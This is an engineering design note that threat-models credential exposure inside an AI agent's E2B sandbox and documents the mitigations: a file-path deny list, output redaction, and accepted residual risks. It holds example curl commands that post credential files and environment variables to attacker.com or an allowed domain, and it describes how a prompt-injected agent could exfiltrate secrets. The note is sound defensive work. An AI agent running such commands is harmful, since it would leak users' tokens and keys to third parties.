---
title: Sandbox Credential Exposure
owners: []
---

# Sandbox Credential Exposure

## Current state

User credentials are injected into the E2B sandbox on creation:

| Credential | Injection method | What it grants |
|---|---|---|
| OAuth tokens (e.g., Claude) | File: `~/.claude/.credentials.json` | Third-party service access |
| GitHub PAT | Env var: `$GITHUB_TOKEN` + git credential helper | Repo access, code push |
| Kael API key | Env var: `$KAEL_API_KEY` + file: `~/.kael-env` | Backend API as this user (8-hour expiry) |
| Other provider tokens | Env vars | Provider-specific access |

The sandbox has **full outbound internet access**. Credentials are available to any process running in the sandbox.

## The risk

A prompt-injected agent could exfiltrate credentials:

```
curl https://attacker.com -d "$(cat ~/.claude/.credentials.json)"
env | curl https://attacker.com -d @-
```

The resource access service checks URLs in commands, but:
- Once a URL is approved (or auto-approved), credentials can be sent to it
- The system can't distinguish legitimate use from exfiltration of an approved resource

## Mitigations

Credential proxy (removing credentials from the sandbox entirely) is deferred — too expensive for the current stage. Instead, complementary layers that significantly raise the bar:

### Layer 1: Expand resource access control to sandbox (implemented)

The sandbox now checks **file paths** in addition to web URLs and commands. Sandbox file paths are blocked if they match the deny list, and silently approved otherwise — no user prompt for non-sensitive files. Web URLs and commands still go through the full interactive pipeline.

**1a. Sandbox file deny list** — the static file deny list (moved from `desktop_control/safety.py` to `resource_access_service.py` as a cross-environment concern) now includes sandbox credential patterns:

| Pattern | Blocks |
|---|---|
| `**/.claude/.credentials.json` | OAuth tokens |
| `**/.kael-env` | Kael API key file |
| `**/.env`, `**/.env.*` | Environment files (existing) |
| `**/*.pem`, `**/*.key` | Key files (existing) |

When the agent's command reads a denied file, the resource access service blocks it before execution.

**1b. E2B egress network policy** — deferred. Domain-based iptables filtering is not feasible (IPs change, DNS proxy too complex). Revisit when E2B SDK adds native network policy support or when credential proxy is implemented.

### Layer 2: Apply output filtering to sandbox (implemented)

`redact_sensitive_output()` from `output_filter.py` is applied to sandbox command output after truncation, before returning to the LLM context. Same patterns already used for desktop: PEM blocks, AWS keys, API keys, JWTs, URL passwords, key=value secrets.

See [context-filtering.md](context-filtering.md) for the full list of redacted patterns.

### What remains unmitigated

- Credentials still exist in the sandbox as env vars and files. A crafted command can still use them (e.g., `git push` uses `$GITHUB_TOKEN` implicitly via the credential helper).
- Egress filtering doesn't prevent exfiltration to allowed domains (e.g., pushing secrets to a public GitHub repo).
- Output filtering is bypassable — the agent can exfiltrate without reading the credential into its context (`curl https://allowed.com -d @~/.kael-env`).

These residual risks are accepted for now. The credential proxy remains the long-term fix.
